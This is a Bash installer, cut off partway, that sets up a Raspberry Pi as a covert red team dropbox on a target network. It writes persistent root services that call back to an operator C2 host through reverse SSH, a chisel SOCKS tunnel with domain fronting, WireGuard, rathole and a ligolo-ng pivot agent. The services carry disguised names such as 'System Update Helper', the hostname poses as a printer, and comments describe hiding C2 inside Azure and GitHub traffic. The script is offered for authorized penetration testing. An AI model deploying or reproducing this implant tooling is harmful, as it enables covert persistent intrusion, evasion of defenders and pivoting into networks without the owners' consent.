#!/usr/bin/env bash
# =============================================================================
# rpi-dropbox-setup.sh — Red Team Dropbox Installer for Raspberry Pi
# =============================================================================
# Sets up a Raspberry Pi as a red team dropbox with multiple C2 callback
# options and traffic routing/pivoting capabilities.
#
# AUTHORIZED USE ONLY — For use in authorized penetration testing engagements.
#
# Usage:
#   sudo bash rpi-dropbox-setup.sh                    # interactive mode
#   sudo C2_HOST=10.0.0.1 bash rpi-dropbox-setup.sh  # env var mode
#
# All config can be set via environment variables (see Configuration section).
# =============================================================================

set -euo pipefail

# =============================================================================
# CONFIGURATION — set via env vars or prompted interactively
# =============================================================================

# C2 / jump host address (required for most modules)
C2_HOST="${C2_HOST:-}"

# autossh reverse SSH settings
SSH_JUMP_USER="${SSH_JUMP_USER:-root}"
SSH_JUMP_PORT="${SSH_JUMP_PORT:-22}"
SSH_REVERSE_PORT="${SSH_REVERSE_PORT:-19922}"  # remote port on jump host for SSH back

# chisel HTTPS tunnel
CHISEL_C2_PORT="${CHISEL_C2_PORT:-443}"        # chisel server port on C2
CHISEL_SOCKS_PORT="${CHISEL_SOCKS_PORT:-1080}" # local SOCKS5 port (operator-side)

# WireGuard VPN
WG_PEER_ENDPOINT="${WG_PEER_ENDPOINT:-}"       # WireGuard server: IP:port
WG_PEER_PUBKEY="${WG_PEER_PUBKEY:-}"           # WireGuard server public key
WG_ALLOWED_IPS="${WG_ALLOWED_IPS:-0.0.0.0/0}" # route all traffic through WG
WG_LISTEN_PORT="${WG_LISTEN_PORT:-51820}"

# Tailscale
TAILSCALE_AUTHKEY="${TAILSCALE_AUTHKEY:-}"     # tskey-auth-... from tailscale.com
TAILSCALE_EXIT_NODE="${TAILSCALE_EXIT_NODE:-false}"

# rathole stealth tunnel
RATHOLE_C2_PORT="${RATHOLE_C2_PORT:-2333}"
RATHOLE_TOKEN="${RATHOLE_TOKEN:-}"             # shared secret for rathole

# ligolo-ng pivot agent
LIGOLO_C2_PORT="${LIGOLO_C2_PORT:-11601}"

# chisel domain fronting / serverless redirector
# When CHISEL_FRONTED_HOST is set, chisel connects to the CDN/serverless edge at that
# hostname (e.g. abc.cloudfront.net or abc.execute-api.us-east-1.amazonaws.com) and sends
# Host: C2_HOST inside the encrypted tunnel — the CDN routes to your actual C2 origin.
# Ref: hackerhermanos.com/posts/red-team-c2-infrastructure/ (CDN redirector pattern)
#      hackerhermanos.com/posts/serverless-c2-redirectors/   (AWS Lambda/API Gateway)
CHISEL_FRONTED_HOST="${CHISEL_FRONTED_HOST:-}"  # CDN edge or API GW hostname (blank = direct)
# Required custom header for redirector validation (workshop pattern: Apache rewrite rules
# check for a custom header before forwarding; scanners without it get 301'd to decoy site).
# Ref: DEF CON 32 workshop — redirector vars: required_http_header
CHISEL_CUSTOM_HEADER="${CHISEL_CUSTOM_HEADER:-}"  # e.g. "X-Auth-Token: secret123"

# Azure Relay Bridge (azbridge)
# Tunnels arbitrary TCP over Azure Service Bus (*.servicebus.windows.net:443).
# Traffic blends with legitimate enterprise Azure traffic — no custom infra needed.
# Ref: hackerhermanos.com/posts/azure-relay-red-teamer/
AZBRIDGE_NAMESPACE="${AZBRIDGE_NAMESPACE:-}"      # Azure Service Bus namespace (no .servicebus...)
AZBRIDGE_RELAY_NAME="${AZBRIDGE_RELAY_NAME:-}"    # Hybrid Connection relay name
AZBRIDGE_SAS_CONN="${AZBRIDGE_SAS_CONN:-}"        # Full SAS connection string from Azure portal
AZBRIDGE_LOCAL_PORT="${AZBRIDGE_LOCAL_PORT:-7777}" # local port the tunnel will be reachable on

# GitHub dead drop C2
# Implant polls a GitHub Issue for commands; executes them; posts output as comments.
# All traffic goes to api.github.com — one of the most trusted domains on earth.
# Ref: hackerhermanos.com/posts/hiding-c2-in-trusted-traffic/ (APT29/APT41 pattern)
DEADROP_GH_TOKEN="${DEADROP_GH_TOKEN:-}"          # GitHub PAT (fine-grained: issues read+write)
DEADROP_GH_REPO="${DEADROP_GH_REPO:-}"            # owner/repo (e.g. myorg/configs)
DEADROP_ISSUE_NUM="${DEADROP_ISSUE_NUM:-1}"        # issue number to poll for commands
DEADROP_POLL_MIN="${DEADROP_POLL_MIN:-15}"         # polling interval in minutes

# Gateway / redsocks
VICTIM_IFACE="${VICTIM_IFACE:-eth1}"          # interface facing victim/target LAN
UPSTREAM_IFACE="${UPSTREAM_IFACE:-eth0}"      # interface facing internet/C2

# OPSEC
DEVICE_HOSTNAME="${DEVICE_HOSTNAME:-hp-laserjet-$(openssl rand -hex 3 2>/dev/null || echo 'a1b2c3')}"
LOCAL_SSH_PORT="${LOCAL_SSH_PORT:-2222}"       # Pi's own SSH port after hardening

# Install prefix
INSTALL_DIR="/opt/dropbox"

# Cover names for systemd services (avoid "red team" in service names)
SVC_AUTOSSH="rpi-telemetry"
SVC_CHISEL="pi-netmon"
SVC_RATHOLE="pi-update-helper"
SVC_LIGOLO="rpi-sysmon"
SVC_REDSOCKS="pi-proxy-helper"
SVC_AZBRIDGE="pi-cloud-sync"
SVC_DEADROP="pi-github-sync"
SVC_WATCHDOG="dropbox-watchdog"

# =============================================================================
# COLOUR OUTPUT
# =============================================================================
RED='\033[0;31m'; YELLOW='\033[1;33m'; GREEN='\033[0;32m'
CYAN='\033[0;36m'; BOLD='\033[1m'; RESET='\033[0m'

info()    { echo -e "${CYAN}[*]${RESET} $*"; }
success() { echo -e "${GREEN}[+]${RESET} $*"; }
warn()    { echo -e "${YELLOW}[!]${RESET} $*"; }
die()     { echo -e "${RED}[✗]${RESET} $*" >&2; exit 1; }
banner()  { echo -e "\n${BOLD}${CYAN}━━━ $* ━━━${RESET}\n"; }

# =============================================================================
# GUARDS
# =============================================================================
[[ $EUID -eq 0 ]] || die "Must run as root. Use: sudo bash $0"

# Detect architecture
ARCH="$(uname -m)"
case "$ARCH" in
  aarch64)          ARCH_LABEL="arm64";  GOARCH="arm64"  ;;
  armv7l|armv7)     ARCH_LABEL="armv7";  GOARCH="arm"    ;;
  armv6l|armv6)     ARCH_LABEL="armv6";  GOARCH="arm"    ;;
  x86_64)           ARCH_LABEL="amd64";  GOARCH="amd64"  ;;
  *)                die "Unsupported architecture: $ARCH" ;;
esac
info "Detected architecture: $ARCH → using label '$ARCH_LABEL'"

# =============================================================================
# BANNER
# =============================================================================
echo -e "${RED}"
cat << 'EOF'
  ██████╗ ██████╗ ██╗    ██████╗ ██████╗  ██████╗ ██████╗ ██████╗  ██████╗ ██╗  ██╗
  ██╔══██╗██╔══██╗██║    ██╔══██╗██╔══██╗██╔═══██╗██╔══██╗██╔══██╗██╔═══██╗╚██╗██╔╝
  ██████╔╝██████╔╝██║    ██║  ██║██████╔╝██║   ██║██████╔╝██████╔╝██║   ██║ ╚███╔╝
  ██╔══██╗██╔═══╝ ██║    ██║  ██║██╔══██╗██║   ██║██╔═══╝ ██╔══██╗██║   ██║ ██╔██╗
  ██║  ██║██║     ██║    ██████╔╝██║  ██║╚██████╔╝██║     ██████╔╝╚██████╔╝██╔╝ ██╗
  ╚═╝  ╚═╝╚═╝     ╚═╝    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═════╝  ╚═════╝ ╚═╝  ╚═╝
  Red Team Dropbox Installer — Authorized Use Only
EOF
echo -e "${RESET}"
warn "This tool is for AUTHORIZED PENETRATION TESTING ONLY."
warn "Unauthorized use is illegal. Ensure written authorization exists."
echo ""

# =============================================================================
# HELPERS
# =============================================================================

install_pkg() {
  local pkg="$1"
  if ! dpkg -l "$pkg" &>/dev/null; then
    info "Installing $pkg..."
    apt-get install -y "$pkg" >/dev/null 2>&1 || warn "Failed to install $pkg — continuing"
  fi
}

backup_file() {
  local path="$1"
  if [[ -f "$path" ]]; then
    local ts; ts="$(date +%Y%m%d%H%M%S)"
    cp "$path" "${path}.bak.${ts}"
    info "Backed up existing $(basename "$path") → $(basename "$path").bak.${ts}"
  fi
}

# Fetch the latest release tag from GitHub
get_latest_tag() {
  local repo="$1"  # e.g. "jpillora/chisel"
  curl -s "https://api.github.com/repos/${repo}/releases/latest" \
    | grep '"tag_name"' | head -1 | cut -d'"' -f4
}

# Download a GitHub release asset matching a pattern
download_github_asset() {
  local repo="$1"
  local pattern="$2"   # grep pattern to match asset name
  local outpath="$3"

  local tag; tag="$(get_latest_tag "$repo")"
  if [[ -z "$tag" ]]; then
    warn "Could not resolve latest release for $repo (rate limited or no network?)"
    return 1
  fi

  local asset_url
  asset_url="$(curl -s "https://api.github.com/repos/${repo}/releases/latest" \
    | grep '"browser_download_url"' \
    | grep -i "$pattern" \
    | head -1 \
    | cut -d'"' -f4)"

  if [[ -z "$asset_url" ]]; then
    warn "No release asset matching '$pattern' found for $repo $tag"
    return 1
  fi

  info "Downloading $repo $tag ($(basename "$asset_url"))..."
  curl -fsSL "$asset_url" -o "$outpath" || { warn "Download failed: $asset_url"; return 1; }
  success "Downloaded to $outpath"
}

enable_service() {
  local svc="$1"
  systemctl daemon-reload
  systemctl enable "$svc"
  info "Enabled $svc (will start on next boot; use 'systemctl start $svc' to start now)"
}

# Prompt with default fallback — uses env var if set, prompts if tty
prompt_config() {
  local var_name="$1"
  local prompt_text="$2"
  local default_val="${!var_name:-}"

  if [[ -n "$default_val" ]]; then
    echo "  $var_name = $default_val (from env)"
    return
  fi

  if [[ -t 0 ]]; then
    read -rp "  ${prompt_text}: " input
    # Use printf -v for safe indirect assignment (avoids eval injection)
    printf -v "$var_name" '%s' "$input"
  else
    warn "$var_name not set and not in interactive mode — skipping prompts"
  fi
}

# =============================================================================
# MODULE SELECTION MENU
# =============================================================================

declare -A MODULES=(
  [autossh]="Reverse SSH tunnel via autossh (most reliable fallback)"
  [chisel]="Chisel HTTPS tunnel + reverse SOCKS5 (CDN/serverless redirector support)"
  [wireguard]="WireGuard VPN callback (fast kernel-native, needs UDP egress)"
  [tailscale]="Tailscale mesh VPN (easiest NAT traversal, lower OPSEC)"
  [rathole]="Rathole stealth tunnel (Noise protocol, low resource)"
  [azbridge]="Azure Relay Bridge (TCP over Azure Service Bus, blends with enterprise traffic)"
  [dead_drop]="GitHub dead drop (C2 via GitHub Issues API — traffic to api.github.com)"
  [ligolo]="Ligolo-ng TUN pivot agent (L3 routing, current practitioner fav)"
  [gateway]="Gateway/NAT routing (Pi as transparent Ethernet bridge)"
  [redsocks]="Redsocks transparent SOCKS proxy (route victim TCP through SOCKS)"
  [ssh_harden]="SSH hardening (key-only auth, non-standard port)"
  [opsec]="OPSEC baseline (hostname spoof, log cleanup cron)"
)

# Order for display
MODULE_ORDER=(autossh chisel wireguard tailscale rathole azbridge dead_drop ligolo gateway redsocks ssh_harden opsec)

declare -A SELECTED=()

select_modules_interactive() {
  banner "MODULE SELECTION"
  echo "  Select modules to install. Press ENTER to confirm each choice (y/n)."
  echo ""
  for mod in "${MODULE_ORDER[@]}"; do
    read -rp "  Install ${BOLD}${mod}${RESET} — ${MODULES[$mod]}? [y/N] " choice
    case "$choice" in
      [Yy]*)  SELECTED[$mod]=1 ; success "  → $mod selected" ;;
      *)      info "  → $mod skipped" ;;
    esac
  done
}

select_modules_env() {
  # If MODULES env var set (comma-separated list), use it
  if [[ -n "${INSTALL_MODULES:-}" ]]; then
    IFS=',' read -ra mods <<< "$INSTALL_MODULES"
    for mod in "${mods[@]}"; do
      mod="$(echo "$mod" | tr -d ' ')"
      SELECTED[$mod]=1
      info "Module from env: $mod"
    done
  else
    # Default headless selection: autossh + chisel + azbridge + ligolo + ssh_harden + opsec
    for mod in autossh chisel azbridge ligolo ssh_harden opsec; do
      SELECTED[$mod]=1
    done
    warn "INSTALL_MODULES not set — defaulting to: autossh, chisel, ligolo, ssh_harden, opsec"
  fi
}

if [[ -t 0 ]]; then
  select_modules_interactive
else
  select_modules_env
fi

# =============================================================================
# CORE SYSTEM SETUP
# =============================================================================
banner "CORE SETUP"

info "Updating package lists..."
apt-get update -qq

info "Installing base dependencies..."
for pkg in curl wget git openssl net-tools iptables iptables-persistent \
           netcat-openbsd ncat iproute2 procps; do
  install_pkg "$pkg"
done

# Enable IP forwarding persistently
if ! grep -q "net.ipv4.ip_forward=1" /etc/sysctl.conf 2>/dev/null; then
  echo "net.ipv4.ip_forward=1" >> /etc/sysctl.conf
  echo "net.ipv6.conf.all.forwarding=1" >> /etc/sysctl.conf
  sysctl -p /etc/sysctl.conf >/dev/null 2>&1
  success "IP forwarding enabled"
else
  info "IP forwarding already enabled"
fi

# Create install directories
mkdir -p "${INSTALL_DIR}/bin" "${INSTALL_DIR}/conf"
success "Install dir: ${INSTALL_DIR}"

# =============================================================================
# MODULE: autossh reverse SSH
# =============================================================================
if [[ "${SELECTED[autossh]:-0}" == "1" ]]; then
  banner "MODULE: autossh Reverse SSH Tunnel"

  prompt_config C2_HOST "C2 jump host IP or hostname"
  prompt_config SSH_JUMP_USER "SSH user on jump host"
  prompt_config SSH_JUMP_PORT "SSH port on jump host (default 22)"
  prompt_config SSH_REVERSE_PORT "Remote port on jump host to forward Pi SSH back (default 19922)"

  install_pkg autossh

  # Generate SSH keypair for the dropbox if not present
  if [[ ! -f /root/.ssh/dropbox_ed25519 ]]; then
    ssh-keygen -t ed25519 -N "" -f /root/.ssh/dropbox_ed25519 -C "dropbox-$(hostname)" >/dev/null 2>&1
    success "Generated SSH keypair: /root/.ssh/dropbox_ed25519"
    echo ""
    warn "OPERATOR ACTION REQUIRED — add this public key to ${SSH_JUMP_USER}@${C2_HOST}:~/.ssh/authorized_keys:"
    echo ""
    cat /root/.ssh/dropbox_ed25519.pub
    echo ""
  fi

  # Add known hosts to avoid interactive prompt on first connect.
  # WARNING: ssh-keyscan uses TOFU (trust on first use) — the key is not verified
  # against a known fingerprint. Verify the C2 host fingerprint out-of-band before
  # first use, or supply a pre-populated known_hosts entry manually.
  if [[ -n "${C2_HOST:-}" ]]; then
    ssh-keyscan -p "${SSH_JUMP_PORT}" -H "${C2_HOST}" >> /root/.ssh/known_hosts 2>/dev/null || true
    warn "  Verify jump host fingerprint out-of-band: ssh-keygen -lf /root/.ssh/known_hosts"
  fi

  cat > "/etc/systemd/system/${SVC_AUTOSSH}.service" << EOF
[Unit]
Description=Remote Telemetry Service
After=network-online.target
Wants=network-online.target
StartLimitIntervalSec=0

[Service]
Type=simple
User=root
Environment="AUTOSSH_GATETIME=0"
Environment="AUTOSSH_PORT=0"
ExecStart=/usr/bin/autossh -M 0 -N \\
  -o "ServerAliveInterval=30" \\
  -o "ServerAliveCountMax=3" \\
  -o "ExitOnForwardFailure=yes" \\
  -o "StrictHostKeyChecking=yes" \\
  -o "IdentityFile=/root/.ssh/dropbox_ed25519" \\
  -p ${SSH_JUMP_PORT} \\
  -R ${SSH_REVERSE_PORT}:localhost:${LOCAL_SSH_PORT} \\
  ${SSH_JUMP_USER}@${C2_HOST:-CHANGEME}
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
EOF

  enable_service "${SVC_AUTOSSH}.service"
  success "autossh service installed: ${SVC_AUTOSSH}.service"
  info "  Operator connects back via: ssh -p ${SSH_REVERSE_PORT} root@${C2_HOST:-JUMP_HOST} (from jump host)"
fi

# =============================================================================
# MODULE: chisel HTTPS tunnel + reverse SOCKS5
# =============================================================================
if [[ "${SELECTED[chisel]:-0}" == "1" ]]; then
  banner "MODULE: Chisel HTTPS Tunnel"

  prompt_config C2_HOST "C2 host running chisel server"
  prompt_config CHISEL_C2_PORT "Chisel server port on C2 (default 443)"

  CHISEL_BIN="${INSTALL_DIR}/bin/chisel"
  if [[ ! -f "$CHISEL_BIN" ]]; then
    # Build arch-specific asset pattern
    case "$ARCH_LABEL" in
      arm64) CHISEL_PATTERN="linux_arm64" ;;
      armv7) CHISEL_PATTERN="linux_armv7" ;;
      armv6) CHISEL_PATTERN="linux_arm"   ;;
      amd64) CHISEL_PATTERN="linux_amd64" ;;
    esac

    TMP_GZ="$(mktemp /tmp/chisel-XXXX.gz)"
    if download_github_asset "jpillora/chisel" "${CHISEL_PATTERN}" "$TMP_GZ"; then
      gunzip -f "$TMP_GZ"
      EXTRACTED="${TMP_GZ%.gz}"
      mv "$EXTRACTED" "$CHISEL_BIN"
      chmod +x "$CHISEL_BIN"
      success "chisel binary installed: $CHISEL_BIN"
    else
      warn "chisel download failed — install manually from https://github.com/jpillora/chisel/releases"
    fi
  else
    info "chisel already present at $CHISEL_BIN"
  fi

  # Build the chisel connect URL and optional header flags
  # Domain fronting / serverless redirector support:
  #   When CHISEL_FRONTED_HOST is set, chisel connects to the CDN edge or AWS API Gateway
  #   at that hostname, but sends Host: C2_HOST inside the encrypted tunnel. The CDN/GW
  #   reads the Host header and routes traffic to the real C2 origin. Traffic in transit
  #   appears to be destined for a trusted cloud provider (CloudFront, Fastly, API GW, etc.).
  #
  #   Ref: hackerhermanos.com/posts/red-team-c2-infrastructure/ (CDN redirector pattern)
  #        hackerhermanos.com/posts/serverless-c2-redirectors/   (AWS Lambda/API GW)
  #        arXiv:2310.17851 — Subramani et al. 2023 (22/30 CDNs still allow SNI mismatch)
  # Accumulate header flags — each becomes a separate --header flag in the service
  CHISEL_EXTRA_FLAGS=""
  if [[ -n "${CHISEL_FRONTED_HOST:-}" ]]; then
    CHISEL_CONNECT_URL="https://${CHISEL_FRONTED_HOST}:${CHISEL_C2_PORT}"
    CHISEL_EXTRA_FLAGS="--header \"Host: ${C2_HOST:-CHANGEME}\""
    info "  Domain fronting mode: connecting via ${CHISEL_FRONTED_HOST}, Host: ${C2_HOST:-CHANGEME}"
    info "  CDN/serverless edge routes to C2 origin via Host header"
  else
    CHISEL_CONNECT_URL="https://${C2_HOST:-CHANGEME}:${CHISEL_C2_PORT}"
    info "  Direct mode: connecting to ${C2_HOST:-CHANGEME}:${CHISEL_C2_PORT}"
    info "  Tip: set CHISEL_FRONTED_HOST=<cdn-or-apigw-hostname> for CDN/serverless redirector mode"
  fi
  # Custom required header for redirector validation (Apache/Lambda filter pattern)
  # The workshop redirector 301-redirects traffic lacking this header to a decoy domain.
  if [[ -n "${CHISEL_CUSTOM_HEADER:-}" ]]; then
    CHISEL_EXTRA_FLAGS="${CHISEL_EXTRA_FLAGS:+${CHISEL_EXTRA_FLAGS} }--header \"${CHISEL_CUSTOM_HEADER}\""
    info "  Custom validation header set: ${CHISEL_CUSTOM_HEADER%%:*}: ***"
  fi

  cat > "/etc/systemd/system/${SVC_CHISEL}.service" << EOF
[Unit]
Description=Network Monitoring Service
After=network-online.target
Wants=network-online.target
StartLimitIntervalSec=0

[Service]
Type=simple
User=root
# Domain fronting: connects to ${CHISEL_FRONTED_HOST:-direct} → routes to ${C2_HOST:-CHANGEME} via Host header
# To use AWS Lambda serverless redirector: set C2_HOST to <api-id>.execute-api.<region>.amazonaws.com
# To use CDN domain fronting: set CHISEL_FRONTED_HOST=<cdn-edge> and C2_HOST=<real-origin>
ExecStart=${CHISEL_BIN} client \\
  --keepalive 25s \\
  --max-retry-count 0 \\
  ${CHISEL_EXTRA_FLAGS:+${CHISEL_EXTRA_FLAGS} \\}
  ${CHISEL_CONNECT_URL} \\
  R:socks
Restart=always
RestartSec=20

[Install]
WantedBy=multi-user.target
EOF

  enable_service "${SVC_CHISEL}.service"
  success "chisel service installed: ${SVC_CHISEL}.service"
  if [[ -n "${CHISEL_FRONTED_HOST:-}" ]]; then
    info "  Domain fronting active: implant → ${CHISEL_FRONTED_HOST} → ${C2_HOST:-CHANGEME}"
  fi
  info "  C2 side: ./chisel server --reverse --port ${CHISEL_C2_PORT} --tls-key server.key --tls-cert server.crt"
  info "  Operator SOCKS5 on C2: 127.0.0.1:1080"
fi

# =============================================================================
# MODULE: WireGuard VPN
# =============================================================================
if [[ "${SELECTED[wireguard]:-0}" == "1" ]]; then
  banner "MODULE: WireGuard VPN"

  if [[ "$ARCH_LABEL" == "armv6" ]]; then
    warn "WireGuard kernel module may not be available on armv6 (Pi Zero W) — skipping"
  else
    prompt_config WG_PEER_ENDPOINT "WireGuard server endpoint (IP:port, e.g. 1.2.3.4:51820)"
    prompt_config WG_PEER_PUBKEY "WireGuard server public key"

    install_pkg wireguard
    install_pkg wireguard-tools

    WG_CONF="/etc/wireguard/wg0.conf"
    if [[ ! -f /etc/wireguard/dropbox_private.key ]]; then
      # Generate with restricted umask so key is never world-readable, even briefly
      (umask 077; wg genkey > /etc/wireguard/dropbox_private.key)
      wg pubkey < /etc/wireguard/dropbox_private.key > /etc/wireguard/dropbox_public.key
      success "Generated WireGuard keypair"
    fi

    PRIV_KEY="$(cat /etc/wireguard/dropbox_private.key)"
    PUB_KEY="$(cat /etc/wireguard/dropbox_public.key)"

    backup_file "$WG_CONF"
    cat > "$WG_CONF" << EOF
[Interface]
PrivateKey = ${PRIV_KEY}
Address = 10.66.66.2/24
DNS = 1.1.1.1

[Peer]
PublicKey = ${WG_PEER_PUBKEY:-CHANGEME}
Endpoint = ${WG_PEER_ENDPOINT:-CHANGEME}
AllowedIPs = ${WG_ALLOWED_IPS}
PersistentKeepalive = 25
EOF
    chmod 600 "$WG_CONF"

    systemctl enable "wg-quick@wg0.service"
    success "WireGuard configured: $WG_CONF"
    echo ""
    warn "OPERATOR ACTION REQUIRED — add this peer to your WireGuard server:"
    echo ""
    cat << WGPEER
[Peer]
# Dropbox $(hostname)
PublicKey = ${PUB_KEY}
AllowedIPs = 10.66.66.2/32
WGPEER
    echo ""
  fi
fi

# =============================================================================
# MODULE: Tailscale
# =============================================================================
if [[ "${SELECTED[tailscale]:-0}" == "1" ]]; then
  banner "MODULE: Tailscale"

  if ! command -v tailscale &>/dev/null; then
    info "Installing Tailscale via signed APT repository..."
    # Use official signed apt repo instead of curl|sh to avoid script injection risk
    curl -fsSL https://pkgs.tailscale.com/stable/raspbian/bookworm.noarmor.gpg \
      | tee /usr/share/keyrings/tailscale-archive-keyring.gpg >/dev/null
    curl -fsSL https://pkgs.tailscale.com/stable/raspbian/bookworm.tailscale-keyring.list \
      | tee /etc/apt/sources.list.d/tailscale.list >/dev/null
    apt-get update -qq
    apt-get install -y tailscale >/dev/null 2>&1
    success "Tailscale installed"
  else
    info "Tailscale already installed"
  fi

  if [[ -n "${TAILSCALE_AUTHKEY:-}" ]]; then
    EXTRA_FLAGS=""
    [[ "${TAILSCALE_EXIT_NODE:-false}" == "true" ]] && EXTRA_FLAGS="--advertise-exit-node"
    # Pass authkey via stdin to avoid exposure in process cmdline / ps output
    echo "${TAILSCALE_AUTHKEY}" | tailscale up --authkey=- --accept-routes ${EXTRA_FLAGS} || \
      warn "tailscale up failed — run manually: tailscale up --authkey=YOUR_KEY"
    success "Tailscale connected"
  else
    warn "TAILSCALE_AUTHKEY not set — run manually: tailscale up --authkey=YOUR_KEY"
    [[ "${TAILSCALE_EXIT_NODE:-false}" == "true" ]] && \
      info "  Add --advertise-exit-node to use Pi as exit node"
  fi
fi

# =============================================================================
# MODULE: rathole stealth tunnel
# =============================================================================
if [[ "${SELECTED[rathole]:-0}" == "1" ]]; then
  banner "MODULE: Rathole Stealth Tunnel"

  prompt_config C2_HOST "C2 host running rathole server"
  prompt_config RATHOLE_C2_PORT "Rathole server port (default 2333)"
  prompt_config RATHOLE_TOKEN "Rathole shared secret token"

  RATHOLE_BIN="${INSTALL_DIR}/bin/rathole"
  if [[ ! -f "$RATHOLE_BIN" ]]; then
    case "$ARCH_LABEL" in
      arm64) RATHOLE_PATTERN="aarch64-unknown-linux-musl" ;;
      armv7) RATHOLE_PATTERN="armv7-unknown-linux-musleabihf" ;;
      armv6) RATHOLE_PATTERN="arm-unknown-linux-musleabihf" ;;
      amd64) RATHOLE_PATTERN="x86_64-unknown-linux-musl" ;;
    esac

    TMP_TGZ="$(mktemp /tmp/rathole-XXXX.tar.gz)"
    if download_github_asset "rapiz1/rathole" "${RATHOLE_PATTERN}" "$TMP_TGZ"; then
      tar -xzf "$TMP_TGZ" -C "${INSTALL_DIR}/bin/" rathole 2>/dev/null || \
        tar -xzf "$TMP_TGZ" -C "${INSTALL_DIR}/bin/" 2>/dev/null
      chmod +x "$RATHOLE_BIN"
      rm -f "$TMP_TGZ"
      success "rathole binary installed: $RATHOLE_BIN"
    else
      warn "rathole download failed — install manually from https://github.com/rapiz1/rathole/releases"
    fi
  fi

  RATHOLE_CONF="${INSTALL_DIR}/conf/rathole-client.toml"
  backup_file "$RATHOLE_CONF"
  cat > "$RATHOLE_CONF" << EOF
[client]
remote_addr = "${C2_HOST:-CHANGEME}:${RATHOLE_C2_PORT}"

[client.services.ssh_back]
token = "${RATHOLE_TOKEN:-CHANGEME}"
local_addr = "127.0.0.1:${LOCAL_SSH_PORT}"
EOF
  chmod 600 "$RATHOLE_CONF"

  cat > "/etc/systemd/system/${SVC_RATHOLE}.service" << EOF
[Unit]
Description=System Update Helper
After=network-online.target
Wants=network-online.target
StartLimitIntervalSec=0

[Service]
Type=simple
User=root
ExecStart=${RATHOLE_BIN} --client ${RATHOLE_CONF}
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
EOF

  enable_service "${SVC_RATHOLE}.service"
  success "rathole service installed: ${SVC_RATHOLE}.service"
  info "  C2 server config to mirror:"
  cat << RHOLE
  [server]
  bind_addr = "0.0.0.0:${RATHOLE_C2_PORT}"

  [server.services.ssh_back]
  token = "${RATHOLE_TOKEN:-CHANGEME}"
  bind_addr = "0.0.0.0:${SSH_REVERSE_PORT}"
RHOLE
fi

# =============================================================================
# MODULE: ligolo-ng TUN pivot agent
# =============================================================================
if [[ "${SELECTED[ligolo]:-0}" == "1" ]]; then
  banner "MODULE: Ligolo-ng Pivot Agent"

  prompt_config C2_HOST "Ligolo-ng operator proxy address (C2 host)"
  prompt_config LIGOLO_C2_PORT "Ligolo-ng proxy port (default 11601)"

  LIGOLO_BIN="${INSTALL_DIR}/bin/ligolo-agent"
  if [[ ! -f "$LIGOLO_BIN" ]]; then
    case "$ARCH_LABEL" in
      arm64) LIGOLO_PATTERN="agent_linux_arm64" ;;
      armv7) LIGOLO_PATTERN="agent_linux_armv7" ;;
      armv6) LIGOLO_PATTERN="agent_linux_arm"   ;;
      amd64) LIGOLO_PATTERN="agent_linux_amd64" ;;
    esac

    TMP_TGZ="$(mktemp /tmp/ligolo-XXXX.tar.gz)"
    if download_github_asset "nicocha30/ligolo-ng" "${LIGOLO_PATTERN}" "$TMP_TGZ"; then
      tar -xzf "$TMP_TGZ" -C "${INSTALL_DIR}/bin/" 2>/dev/null || true
      # Binary may be named "agent" inside the archive
      if [[ -f "${INSTALL_DIR}/bin/agent" ]]; then
        mv "${INSTALL_DIR}/bin/agent" "$LIGOLO_BIN"
      fi
      chmod +x "$LIGOLO_BIN"
      rm -f "$TMP_TGZ"
      success "ligolo-ng agent installed: $LIGOLO_BIN"
    else
      warn "ligolo-ng download failed — install manually from https://github.com/nicocha30/ligolo-ng/releases"
    fi
  fi

  cat > "/etc/systemd/system/${SVC_LIGOLO}.service" << EOF
[Unit]
Description=System Monitor Agent
After=network-online.target
Wants=network-online.target
StartLimitIntervalSec=0

[Service]
Type=simple
User=root
# NOTE: -ignore-cert disables TLS cert validation. Replace with -accept-fingerprint HASH
# for pinned-cert validation. Get fingerprint from: ./ligolo-proxy -selfcert (prints on start)
ExecStart=${LIGOLO_BIN} -connect ${C2_HOST:-CHANGEME}:${LIGOLO_C2_PORT} -ignore-cert
Restart=always
RestartSec=20

[Install]
WantedBy=multi-user.target
EOF

  enable_service "${SVC_LIGOLO}.service"
  success "ligolo-ng service installed: ${SVC_LIGOLO}.service"
  info "  Operator runs: ./ligolo-proxy -selfcert -laddr 0.0.0.0:${LIGOLO_C2_PORT}"
  info "  After connect: session → start → route add VICTIM_SUBNET/24 dev ligolo"
fi

# =============================================================================
# MODULE: Azure Relay Bridge
# =============================================================================
# Tunnels arbitrary TCP through Azure Service Bus (*.servicebus.windows.net:443).
# TLSv1.2 to Microsoft infrastructure — blends perfectly in corporate environments
# where Azure Service Bus connections "happen thousands of times a day."
# No custom ingress ports required; pure outbound on 443.
# Ref: hackerhermanos.com/posts/azure-relay-red-teamer/
#      github.com/Azure/azure-relay-bridge
# =============================================================================
if [[ "${SELECTED[azbridge]:-0}" == "1" ]]; then
  banner "MODULE: Azure Relay Bridge"

  prompt_config AZBRIDGE_NAMESPACE "Azure Service Bus namespace (no .servicebus suffix)"
  prompt_config AZBRIDGE_RELAY_NAME "Hybrid Connection relay name"
  prompt_config AZBRIDGE_SAS_CONN "Full SAS connection string (from Azure portal → Shared Access Policies)"
  prompt_config AZBRIDGE_LOCAL_PORT "Local port to bind the forwarded tunnel on this Pi (default 7777)"

  AZBRIDGE_BIN="${INSTALL_DIR}/bin/azbridge"
  if [[ ! -f "$AZBRIDGE_BIN" ]]; then
    # azbridge releases: https://github.com/Azure/azure-relay-bridge/releases
    # Assets are named e.g. azbridge_0.x.x_debian.12_linux_arm64.deb or
    # azbridge_0.x.x_linux-arm64.tar.gz — pattern varies by release.
    case "$ARCH_LABEL" in
      arm64) AZB_PATTERN="linux-arm64" ;;
      armv7) AZB_PATTERN="linux-arm"   ;;
      armv6) AZB_PATTERN="linux-arm"   ;;
      amd64) AZB_PATTERN="linux-x64"   ;;
    esac

    TMP_AZB="$(mktemp /tmp/azbridge-XXXX)"
    # Try .deb first (preferred on Debian/Raspberry Pi OS)
    DEB_PATTERN="debian.*${AZB_PATTERN}"
    if download_github_asset "Azure/azure-relay-bridge" "${DEB_PATTERN}.deb" "${TMP_AZB}.deb" 2>/dev/null; then
      dpkg -i "${TMP_AZB}.deb" >/dev/null 2>&1 && \
        AZBRIDGE_BIN="$(command -v azbridge 2>/dev/null || echo /usr/local/bin/azbridge)"
      rm -f "${TMP_AZB}.deb"
    else
      # Fallback: .tar.gz
